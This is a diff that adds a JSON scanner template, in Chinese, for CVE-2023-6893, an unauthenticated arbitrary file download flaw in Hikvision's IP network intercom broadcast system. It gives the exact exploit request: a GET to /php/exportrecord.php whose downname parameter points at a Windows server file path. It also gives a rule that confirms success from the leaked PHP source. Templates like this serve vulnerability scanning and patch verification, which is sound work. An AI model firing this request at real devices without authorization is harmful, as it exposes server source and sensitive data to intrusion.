@@ -1,0 +1,37 @@
+{
+  "product": "海康威视IP网络对讲广播系统",
+  "vul_name": "海康威视IP网络对讲广播系统 exportrecord.php任意文件下载",
+  "type": "文件下载",
+  "vul_id": [
+    "CVE-2023-6893"
+  ],
+  "level": 3,
+  "vul_desc": "IP网络对讲广播系统在3.0.3_20201113_RELEASE(HIK)版本中存在任意文件下载漏洞，未授权的攻击者能够通过/php/exportrecord.php文件读取任意文件内容，导致服务器的敏感信息泄露",
+  "version": "",
+  "note": "",
+  "search": {},
+  "protocol": "http",
+  "link": "",
+  "fix": [
+    "建议联系软件厂商进行处理。"
+  ],
+  "model": "",
+  "logic": "and",
+  "exploit": {
+    "exp": {
+      "method": "get",
+      "follow": false,
+      "path": "/php/exportrecord.php?downtype=10&downname=C:\\ICPAS\\Wnmp\\WWW\\php\\conversion.php"
+    },
+    "verify": {
+      "path": "",
+      "logic": "and",
+      "check": [
+        {
+          "status": 200,
+          "body": "header('Access-Control-Allow-origin"
+        }
+      ]
+    }
+  }
+}
